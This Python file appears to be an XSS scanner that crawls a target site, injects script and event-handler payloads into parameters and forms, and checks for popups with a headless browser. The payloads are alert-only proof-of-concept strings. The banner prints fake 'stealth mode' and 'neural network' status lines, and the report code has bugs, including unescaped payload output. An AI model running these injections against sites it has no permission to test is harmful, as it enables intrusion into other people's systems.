#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced XSS Scanner - Fixed Version
Professional XSS Detection Tool with Proper Popup Verification
"""

import requests
import re
import time
import json
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
import random
import os
import sys
from datetime import datetime
import hashlib
import argparse
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScanner:
    def __init__(self, target_url, max_depth=3, delay=1, timeout=10):
        self.target_url = target_url
        self.base_domain = urlparse(target_url).netloc
        self.max_depth = max_depth
        self.delay = delay
        self.timeout = timeout
        
        # Setup session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Setup Selenium for popup verification
        self.driver = None
        self.setup_selenium()
        
        # Results
        self.vulnerabilities = []
        self.crawled_urls = set()
        self.forms = []
        self.parameters = {}
        self.tested_parameters = set()  # Track tested parameters to avoid duplicates
        
        # Custom signature
        self.signature = "XSS_CONFIRMED_" + hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        # Enhanced payloads with tag closing
        self.payloads = {
            'html': [
                f'<script>alert("{self.signature}")</script>',
                f'<img src=x onerror=alert("{self.signature}")>',
                f'<svg onload=alert("{self.signature}")>',
                f'<iframe src="javascript:alert(\'{self.signature}\')"></iframe>',
            ],
            'attribute': [
                f'"><img src=x onerror=alert("{self.signature}")>',  # Close tag first
                f'\'>< img src=x onerror=alert("{self.signature}")>',
                f'"><svg onload=alert("{self.signature}")>',
                f'\'>< svg onload=alert("{self.signature}")>',
                f'"><script>alert("{self.signature}")</script>',
                f'" onmouseover="alert(\'{self.signature}\')" "',
                f'\' onmouseover=\'alert("{self.signature}")\' \'',
                f'" onfocus="alert(\'{self.signature}\')" autofocus "',
            ],
            'javascript': [
                f'\'; alert("{self.signature}"); //',
                f'\"; alert(\'{self.signature}\'); //',
                f'`; alert("{self.signature}"); //',
                f'</script><script>alert("{self.signature}")</script>',
            ],
            'url': [
                f'javascript:alert("{self.signature}")',
                f'data:text/html,<script>alert("{self.signature}")</script>',
            ]
        }
        
        # Statistics
        self.stats = {
            'urls_crawled': 0,
            'forms_found': 0,
            'parameters_found': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0,
            'screenshots_taken': 0
        }

    def setup_selenium(self):
        """Setup Selenium WebDriver for popup verification"""
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
            
            chrome_options = Options()
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--window-size=1920,1080')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--log-level=3')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.set_page_load_timeout(self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Browser driver initialized for popup verification")
            
        except Exception as e:
            print(f"{Fore.YELLOW}[{Fore.RED}WARN{Fore.YELLOW}] {Fore.WHITE}Browser driver failed: {e}")
            print(f"{Fore.YELLOW}[{Fore.RED}INFO{Fore.YELLOW}] {Fore.WHITE}Continuing without popup verification...")
            self.driver = None

    def print_banner(self):
        """Matrix-style banner"""
        banner = f"""
{Fore.GREEN}
╔══════════════════════════════════════════════════════════════════════╗
║  {Fore.RED}██{Fore.GREEN}╗  {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗    {Fore.RED}███████{Fore.GREEN}╗ {Fore.RED}██████{Fore.GREEN}╗ {Fore.RED}█████{Fore.GREEN}╗ {Fore.RED}███{Fore.GREEN}╗   {Fore.RED}██{Fore.GREEN}╗{Fore.RED}███████{Fore.GREEN}╗{Fore.RED}██████{Fore.GREEN}╗  ║
║  {Fore.RED}╚██╗██╔╝{Fore.GREEN}██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗ ║
║   {Fore.RED}╚███╔╝ {Fore.GREEN}███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝ ║
║   {Fore.RED}██╔██╗ {Fore.GREEN}╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗ ║
║  {Fore.RED}██╔╝ ██╗{Fore.GREEN}███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║ ║
║  {Fore.RED}╚═╝  ╚═╝{Fore.GREEN}╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Advanced Cross-Site Scripting Detection Framework     ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}Professional Penetration Testing Tool               ║
║  {Fore.CYAN}[{Fore.RED}+{Fore.CYAN}] {Fore.WHITE}WAF Bypass • Context-Aware • Popup Verified         ║
╠══════════════════════════════════════════════════════════════════════╣
║  {Fore.YELLOW}Target:{Fore.WHITE} {self.target_url:<55} ║
║  {Fore.YELLOW}Config:{Fore.WHITE} Depth={self.max_depth} | Delay={self.delay}s | Timeout={self.timeout}s{' ' * (50 - len(f'Depth={self.max_depth} | Delay={self.delay}s | Timeout={self.timeout}s'))} ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}

{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Initializing neural network...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Loading payload database...{Fore.GREEN} DONE  
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Activating stealth mode...{Fore.GREEN} DONE
{Fore.GREEN}[{Fore.RED}!{Fore.GREEN}] {Fore.WHITE}Popup verification system...{Fore.GREEN} READY
"""
        print(banner)

    def test_connectivity(self):
        """Test target connectivity"""
        print(f"{Fore.GREEN}[{Fore.RED}INIT{Fore.GREEN}] {Fore.WHITE}Testing target connectivity...")
        
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[{Fore.RED}CONN{Fore.GREEN}] {Fore.WHITE}Target responded - Status: {response.status_code}")
            return True
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connection failed - Check target URL")
            return False
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Connectivity test failed: {e}")
            return False

    def crawl_target(self):
        """Crawl target and discover test points"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 1{Fore.GREEN}] {Fore.WHITE}RECONNAISSANCE & TARGET ENUMERATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        urls_to_scan = [self.target_url]
        
        # Add common endpoints
        base_url = f"{urlparse(self.target_url).scheme}://{urlparse(self.target_url).netloc}"
        common_paths = [
            '/search', '/login', '/contact', '/register', '/profile',
            '/search?q=test', '/index.php?id=1', '/?search=test'
        ]
        
        for path in common_paths:
            urls_to_scan.append(base_url + path)
        
        for url in urls_to_scan[:10]:  # Limit to 10 URLs
            try:
                print(f"{Fore.GREEN}[{Fore.RED}CRAWL{Fore.GREEN}] {Fore.WHITE}Scanning: {url}")
                
                response = self.session.get(url, timeout=self.timeout)
                if response.status_code == 200:
                    self.crawled_urls.add(url)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract forms
                    forms = soup.find_all('form')
                    for form in forms:
                        form_data = self.extract_form_data(form, url)
                        if form_data:
                            self.forms.append(form_data)
                            print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}Found: {form_data['action']} ({len(form_data['inputs'])} inputs)")
                    
                    # Extract parameters
                    parsed = urlparse(url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        if url not in self.parameters:
                            self.parameters[url] = {}
                        for param, values in params.items():
                            self.parameters[url][param] = values[0] if values else ''
                            print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}Found: {param}")
                
                time.sleep(self.delay)
                
            except Exception as e:
                print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}{url} - {str(e)[:30]}")
        
        # Update stats
        self.stats['urls_crawled'] = len(self.crawled_urls)
        self.stats['forms_found'] = len(self.forms)
        self.stats['parameters_found'] = sum(len(p) for p in self.parameters.values())
        
        print(f"\n{Fore.GREEN}[{Fore.RED}RECON{Fore.GREEN}] {Fore.WHITE}Reconnaissance Summary:")
        print(f"{Fore.GREEN}[{Fore.RED}INFO{Fore.GREEN}] {Fore.WHITE}URLs: {self.stats['urls_crawled']} | Forms: {self.stats['forms_found']} | Parameters: {self.stats['parameters_found']}")
        
        # Add fallback parameters if none found
        if not self.parameters and self.crawled_urls:
            main_url = list(self.crawled_urls)[0]
            self.parameters[main_url] = {
                'search': 'test', 'q': 'test', 'id': '1', 'name': 'test'
            }
            self.stats['parameters_found'] = 4
            print(f"{Fore.YELLOW}[{Fore.RED}FALLBACK{Fore.YELLOW}] {Fore.WHITE}Added 4 common test parameters")

    def extract_form_data(self, form, base_url):
        """Extract form data"""
        try:
            action = form.get('action', '') or base_url
            action_url = urljoin(base_url, action)
            method = form.get('method', 'GET').upper()
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name', '')
                if name and input_tag.get('type', '') not in ['submit', 'button']:
                    inputs.append({
                        'name': name,
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', '')
                    })
            
            if inputs:
                return {
                    'action': action_url,
                    'method': method,
                    'inputs': inputs,
                    'base_url': base_url
                }
        except:
            pass
        return None

    def test_parameters(self):
        """Test URL parameters for XSS"""
        print(f"\n{Fore.YELLOW}{'='*70}")
        print(f"{Fore.GREEN}[{Fore.RED}PHASE 2{Fore.GREEN}] {Fore.WHITE}PARAMETER EXPLOITATION")
        print(f"{Fore.YELLOW}{'='*70}")
        
        if not self.parameters:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No parameters to test")
            return
        
        for url, params in self.parameters.items():
            for param_name in params:
                param_key = f"{url}#{param_name}"
                
                # Skip if already found vulnerability for this parameter
                if param_key in self.tested_parameters:
                    print(f"{Fore.CYAN}[{Fore.RED}SKIP{Fore.CYAN}] {Fore.WHITE}Parameter {param_name} already tested")
                    continue
                
                print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Testing parameter: {param_name}")
                
                # Test each context until we find a working vulnerability
                vulnerability_found = False
                for context, payloads in self.payloads.items():
                    if vulnerability_found:
                        break
                        
                    for payload in payloads:
                        if self.test_single_parameter(url, param_name, payload, context):
                            vulnerability_found = True
                            self.tested_parameters.add(param_key)
                            print(f"{Fore.GREEN}[{Fore.RED}SUCCESS{Fore.GREEN}] {Fore.WHITE}Vulnerability confirmed - stopping further tests for {param_name}")
                            break
                        time.sleep(self.delay)
                
                if not vulnerability_found:
                    print(f"{Fore.CYAN}[{Fore.RED}CLEAN{Fore.CYAN}] {Fore.WHITE}No vulnerability found in parameter: {param_name}")

    def test_single_parameter(self, url, param_name, payload, context):
        """Test single parameter with payload and verify popup"""
        try:
            # Build test URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query) if parsed.query else {}
            params[param_name] = [payload]
            
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
            
            # Make request
            response = self.session.get(test_url, timeout=self.timeout)
            self.stats['payloads_tested'] += 1
            
            # Check for reflection first
            if self.check_reflection(response, payload):
                print(f"{Fore.YELLOW}[{Fore.RED}REFLECT{Fore.YELLOW}] {Fore.WHITE}Payload reflected - verifying popup...")
                
                # CRITICAL: Only confirm if popup is actually shown
                if self.verify_popup_with_selenium(test_url):
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': test_url,
                        'parameter': param_name,
                        'payload': payload,
                        'context': context,
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['vulnerabilities_found'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}XSS VULNERABILITY CONFIRMED WITH POPUP!")
                    print(f"{Fore.GREEN}[{Fore.RED}PARAM{Fore.GREEN}] {Fore.WHITE}{param_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{test_url}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    # Take screenshot ONLY after popup confirmation
                    screenshot_path = self.take_screenshot(test_url, f"xss_param_{param_name}_{len(self.vulnerabilities)}")
                    if screenshot_path:
                        print(f"{Fore.GREEN}[{Fore.RED}SCREENSHOT{Fore.GREEN}] {Fore.WHITE}Saved: {screenshot_path}")
                        self.stats['screenshots_taken'] += 1
                    
                    return True
                else:
                    print(f"{Fore.RED}[{Fore.YELLOW}FAILED{Fore.RED}] {Fore.WHITE}No popup shown - vulnerability NOT confirmed")
                    return False
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Test failed: {str(e)[:30]}")
            return False

    def check_reflection(self, response, payload):
        """Check if payload is reflected in response"""
        try:
            # Only check for reflection, not execution
            response_text = response.text
            
            # Look for key parts of payload in response
            if '<script>' in payload and '<script>' in response_text:
                return True
            if 'onerror=' in payload and 'onerror=' in response_text:
                return True
            if 'onload=' in payload and 'onload=' in response_text:
                return True
            if 'javascript:' in payload and 'javascript:' in response_text:
                return True
            if '"><' in payload and '"><' in response_text:
                return True
            
            return False
        except:
            return False

    def verify_popup_with_selenium(self, url):
        """CRITICAL: Verify actual popup is shown using Selenium"""
        if not self.driver:
            print(f"{Fore.RED}[{Fore.YELLOW}NO_BROWSER{Fore.RED}] {Fore.WHITE}Cannot verify popup - no browser driver")
            return False
        
        try:
            print(f"{Fore.CYAN}[{Fore.RED}VERIFY{Fore.CYAN}] {Fore.WHITE}Loading page to check for popup...")
            
            # Load the page
            self.driver.get(url)
            time.sleep(3)  # Wait for page and JavaScript to load
            
            # Check for alert popup
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                from selenium.common.exceptions import TimeoutException
                
                # Wait for alert to appear
                alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                alert_text = alert.text
                
                print(f"{Fore.CYAN}[{Fore.RED}POPUP{Fore.CYAN}] {Fore.WHITE}Alert detected: {alert_text}")
                
                # Check if our signature is in the alert
                if self.signature in alert_text:
                    alert.accept()  # Close the alert
                    print(f"{Fore.GREEN}[{Fore.RED}VERIFIED{Fore.GREEN}] {Fore.WHITE}Popup contains our signature - XSS CONFIRMED!")
                    return True
                else:
                    alert.accept()  # Close the alert
                    print(f"{Fore.RED}[{Fore.YELLOW}WRONG{Fore.RED}] {Fore.WHITE}Popup found but wrong signature")
                    return False
                    
            except TimeoutException:
                print(f"{Fore.RED}[{Fore.YELLOW}NO_POPUP{Fore.RED}] {Fore.WHITE}No popup appeared - XSS not confirmed")
                return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Popup verification failed: {e}")
            return False

    def test_forms(self):
        """Test forms for XSS"""
        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing Forms...")
        
        if not self.forms:
            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No forms to test")
            return
        
        for form in self.forms:
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}Form: {form['action']} ({form['method']})")
            
            for input_field in form['inputs']:
                input_name = input_field['name']
                form_key = f"{form['action']}#{input_name}"
                
                # Skip if already found vulnerability for this input
                if form_key in self.tested_parameters:
                    print(f"{Fore.CYAN}[{Fore.RED}SKIP{Fore.CYAN}] {Fore.WHITE}Input {input_name} already tested")
                    continue
                
                print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}Testing: {input_name}")
                
                # Test until we find a working vulnerability
                vulnerability_found = False
                for context, payloads in self.payloads.items():
                    if vulnerability_found:
                        break
                        
                    for payload in payloads:
                        if self.test_form_input(form, input_name, payload, context):
                            vulnerability_found = True
                            self.tested_parameters.add(form_key)
                            print(f"{Fore.GREEN}[{Fore.RED}SUCCESS{Fore.GREEN}] {Fore.WHITE}Vulnerability confirmed - stopping further tests for {input_name}")
                            break
                        time.sleep(self.delay)
                
                if not vulnerability_found:
                    print(f"{Fore.CYAN}[{Fore.RED}CLEAN{Fore.CYAN}] {Fore.WHITE}No vulnerability found in input: {input_name}")

    def test_form_input(self, form, input_name, payload, context):
        """Test form input with payload and verify popup"""
        try:
            # Prepare form data
            form_data = {}
            for input_field in form['inputs']:
                if input_field['name'] == input_name:
                    form_data[input_field['name']] = payload
                else:
                    # Default values
                    if 'email' in input_field['name'].lower():
                        form_data[input_field['name']] = 'test@example.com'
                    else:
                        form_data[input_field['name']] = input_field['value'] or 'test'
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
                test_url = form['action']
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
                test_url = form['action'] + '?' + urllib.parse.urlencode(form_data)
            
            self.stats['payloads_tested'] += 1
            
            # Check for reflection
            if self.check_reflection(response, payload):
                print(f"{Fore.YELLOW}[{Fore.RED}REFLECT{Fore.YELLOW}] {Fore.WHITE}Payload reflected - verifying popup...")
                
                # CRITICAL: Verify popup with Selenium
                if self.verify_form_popup_with_selenium(form, form_data):
                    vuln = {
                        'type': 'Form XSS',
                        'url': form['action'],
                        'parameter': input_name,
                        'payload': payload,
                        'context': context,
                        'method': form['method'],
                        'confirmed': True,
                        'score': 20,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.vulnerabilities.append(vuln)
                    self.stats['vulnerabilities_found'] += 1
                    
                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}FORM XSS VULNERABILITY CONFIRMED WITH POPUP!")
                    print(f"{Fore.GREEN}[{Fore.RED}INPUT{Fore.GREEN}] {Fore.WHITE}{input_name}")
                    print(f"{Fore.GREEN}[{Fore.RED}FORM{Fore.GREEN}] {Fore.WHITE}{form['action']}")
                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}20/20")
                    
                    # Take screenshot ONLY after popup confirmation
                    screenshot_path = self.take_screenshot(test_url, f"xss_form_{input_name}_{len(self.vulnerabilities)}")
                    if screenshot_path:
                        print(f"{Fore.GREEN}[{Fore.RED}SCREENSHOT{Fore.GREEN}] {Fore.WHITE}Saved: {screenshot_path}")
                        self.stats['screenshots_taken'] += 1
                    
                    return True
                else:
                    print(f"{Fore.RED}[{Fore.YELLOW}FAILED{Fore.RED}] {Fore.WHITE}No popup shown - vulnerability NOT confirmed")
                    return False
            
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Form test failed: {str(e)[:30]}")
            return False

    def verify_form_popup_with_selenium(self, form, form_data):
        """Verify form XSS popup with Selenium"""
        if not self.driver:
            return False
        
        try:
            # Navigate to form page
            self.driver.get(form['base_url'])
            time.sleep(2)
            
            # Fill form fields
            for field_name, field_value in form_data.items():
                try:
                    from selenium.webdriver.common.by import By
                    element = self.driver.find_element(By.NAME, field_name)
                    element.clear()
                    element.send_keys(field_value)
                except:
                    pass
            
            # Submit form
            try:
                submit_button = self.driver.find_element(By.CSS_SELECTOR, "input[type='submit'], button[type='submit'], button")
                submit_button.click()
            except:
                try:
                    form_element = self.driver.find_element(By.TAG_NAME, "form")
                    form_element.submit()
                except:
                    pass
            
            time.sleep(3)  # Wait for response and JavaScript execution
            
            # Check for alert popup
            try:
                from selenium.webdriver.support.ui import WebDriverWait
                from selenium.webdriver.support import expected_conditions as EC
                from selenium.common.exceptions import TimeoutException
                
                alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                alert_text = alert.text
                
                print(f"{Fore.CYAN}[{Fore.RED}POPUP{Fore.CYAN}] {Fore.WHITE}Alert detected: {alert_text}")
                
                if self.signature in alert_text:
                    alert.accept()
                    print(f"{Fore.GREEN}[{Fore.RED}VERIFIED{Fore.GREEN}] {Fore.WHITE}Popup contains our signature - XSS CONFIRMED!")
                    return True
                else:
                    alert.accept()
                    print(f"{Fore.RED}[{Fore.YELLOW}WRONG{Fore.RED}] {Fore.WHITE}Popup found but wrong signature")
                    return False
                    
            except TimeoutException:
                print(f"{Fore.RED}[{Fore.YELLOW}NO_POPUP{Fore.RED}] {Fore.WHITE}No popup appeared - XSS not confirmed")
                return False
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Form popup verification failed: {e}")
            return False

    def take_screenshot(self, url, filename):
        """Take screenshot ONLY when popup is confirmed"""
        if not self.driver:
            print(f"{Fore.RED}[{Fore.YELLOW}NO_BROWSER{Fore.RED}] {Fore.WHITE}Cannot take screenshot - no browser")
            return None
        
        try:
            # Create screenshots directory
            screenshot_dir = "screenshots"
            if not os.path.exists(screenshot_dir):
                os.makedirs(screenshot_dir)
            
            # Navigate to URL again for screenshot
            self.driver.get(url)
            time.sleep(2)
            
            # Take screenshot
            screenshot_path = os.path.join(screenshot_dir, f"{filename}.png")
            self.driver.save_screenshot(screenshot_path)
            
            return screenshot_path
            
        except Exception as e:
            print(f"{Fore.RED}[{Fore.YELLOW}ERROR{Fore.RED}] {Fore.WHITE}Screenshot failed: {e}")
            return None

    def generate_report(self):
        """Generate HTML report"""
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>XSS Scanner Report - {self.target_url}</title>
    <style>
        body {{
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
            color: #00ff00;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.9);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 30px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff00;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-card {{
            background: rgba(0, 50, 0, 0.5);
            border: 1px solid #00ff00;
            padding: 20px;
            text-align: center;
            border-radius: 5px;
        }}
        .stat-number {{
            font-size: 2em;
            color: #ff0000;
            font-weight: bold;
            text-shadow: 0 0 10px #ff0000;
        }}
        .vulnerability {{
            background: rgba(50, 0, 0, 0.5);
            border: 2px solid #ff0000;
            padding: 20px;
            margin: 20px 0;
            border-radius: 5px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
        }}
        .payload {{
            background: #000;
            color: #00ff00;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin: 10px 0;
            overflow-x: auto;
        }}
        .score {{
            background: linear-gradient(45deg, #ff0000, #ff6600);
            color: white;
            padding: 8px 15px;
            border-radius: 15px;
            font-weight: bold;
        }}
        .confirmed {{
            color: #00ff00;
            font-weight: bold;
            text-shadow: 0 0 5px #00ff00;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>XSS SCANNER INTELLIGENCE REPORT</h1>
            <h2>{self.target_url}</h2>
            <p>SCAN TIMESTAMP: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p class="confirmed">POPUP VERIFICATION: {"ENABLED" if self.driver else "DISABLED"}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{self.stats['urls_crawled']}</div>
                <div>URLS CRAWLED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['forms_found']}</div>
                <div>FORMS FOUND</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['payloads_tested']}</div>
                <div>PAYLOADS TESTED</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['vulnerabilities_found']}</div>
                <div>CONFIRMED VULNS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{self.stats['screenshots_taken']}</div>
                <div>SCREENSHOTS</div>
            </div>
        </div>
        
        <h2>CONFIRMED VULNERABILITIES (POPUP VERIFIED)</h2>
"""
        
        if not self.vulnerabilities:
            html_content += "<p>NO CONFIRMED VULNERABILITIES FOUND</p>"
            html_content += "<p><em>Note: Only vulnerabilities with confirmed popup alerts are reported</em></p>"
        else:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                html_content += f"""
        <div class="vulnerability">
            <h3>VULNERABILITY #{i} - {vuln['type']} <span class="confirmed">[POPUP CONFIRMED]</span></h3>
            <p><strong>URL:</strong> {vuln['url']}</p>
            <p><strong>PARAMETER:</strong> {vuln['parameter']}</p>
            <p><strong>METHOD:</strong> {vuln['method']}</p>
            <p><strong>CONTEXT:</strong> {vuln['context']}</p>
            <p><strong>SCORE:</strong> <span class="score">{vuln['score']}/20</span></p>
            <p><strong>PAYLOAD:</strong></p>
            <div class="payload">{vuln['payload']}</div>
            <p><strong>TIMESTAMP:</strong> {vuln['timestamp']}</p>
        </div>
"""
        
        html_content += """
        <div style="margin-top: 30px; padding: 20px; background: rgba(0, 50, 0, 0.3); border: 1px solid #00ff00; border-radius: 5px;">
            <h3>VERIFICATION METHODOLOGY</h3>
            <p>✅ All reported vulnerabilities have been verified with actual popup alerts</p>
            <p>✅ Only vulnerabilities showing our custom signature are confirmed</p>
            <p>✅ Screenshots are taken only after popup confirmation</p>
            <p>⚠️ Reflected payloads without popup are NOT reported as vulnerabilities</p>
        </div>
    </div>
</body>
</html>
"""
        
        filename = f"xss_report_verified_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}HTML report: {filename}")
        return filename

    def generate_json_report(self):
        """Generate JSON report"""
        report_data = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'verification_method': 'popup_confirmed' if self.driver else 'reflection_only',
            'statistics': self.stats,
            'vulnerabilities': self.vulnerabilities,
            'note': 'Only vulnerabilities with confirmed popup alerts are included'
        }
        
        filename = f"xss_report_verified_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}JSON report: {filename}")
        return filename

    def run_scan(self):
        """Run complete scan with proper verification"""
        self.print_banner()
        
        try:
            # Test connectivity
            if not self.test_connectivity():
                print(f"{Fore.RED}[{Fore.YELLOW}ABORT{Fore.RED}] {Fore.WHITE}Cannot connect to target")
                return
            
            # Phase 1: Crawling
            self.crawl_target()
            
            # Phase 2: Testing
            self.test_parameters()
            self.test_forms()
            
            # Generate reports
            print(f"\n{Fore.YELLOW}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}REPORT{Fore.GREEN}] {Fore.WHITE}GENERATING VERIFIED REPORTS")
            print(f"{Fore.YELLOW}{'='*70}")
            
            html_report = self.generate_report()
            json_report = self.generate_json_report()
            
            # Final results
            print(f"\n{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}RESULTS{Fore.GREEN}] {Fore.WHITE}SCAN COMPLETE - POPUP VERIFIED RESULTS")
            print(f"{Fore.GREEN}{'='*70}")
            print(f"{Fore.GREEN}[{Fore.RED}TARGET{Fore.GREEN}] {Fore.WHITE}{self.target_url}")
            print(f"{Fore.GREEN}[{Fore.RED}STATS{Fore.GREEN}] {Fore.WHITE}URLs: {self.stats['urls_crawled']} | Forms: {self.stats['forms_found']} | Payloads: {self.stats['payloads_tested']}")
            print(f"{Fore.GREEN}[{Fore.RED}VERIFIED{Fore.GREEN}] {Fore.WHITE}{self.stats['vulnerabilities_found']} vulnerabilities with confirmed popup")
            print(f"{Fore.GREEN}[{Fore.RED}SCREENSHOTS{Fore.GREEN}] {Fore.WHITE}{self.stats['screenshots_taken']} screenshots captured")
            
